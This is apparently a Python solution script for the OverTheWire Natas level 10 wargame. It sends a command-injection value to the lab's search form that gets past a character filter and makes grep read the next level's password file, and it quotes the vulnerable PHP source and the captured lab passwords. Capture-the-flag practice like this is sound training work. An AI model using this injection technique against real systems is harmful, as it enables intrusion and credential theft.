#The password for natas10 :: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu

import requests

username = 'natas10'
password = 'nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu'

siteUrl = 'http://{}.natas.labs.overthewire.org/index-source.html'.format(username)
print("="*50)
print(siteUrl)
print("="*50)

def loginWebSite():
    r = requests.get(siteUrl, auth = (username, password))
    print(r.text)

def command_injection():
    siteUrl = 'http://{}.natas.labs.overthewire.org'.format(username)
    needle = '. /etc/natas_webpass/natas11 #'
    session = requests.Session()
    r = session.post(siteUrl, data = {"needle":needle, "submit":"submit"}, auth = (username, password))
    print(r.text)


#loginWebSite()              
command_injection()         #/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK

#[SOURCE CODE]
#passthru — Execute an external program and display raw output
#https://www.php.net/manual/en/function.passthru.php

'''
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
'''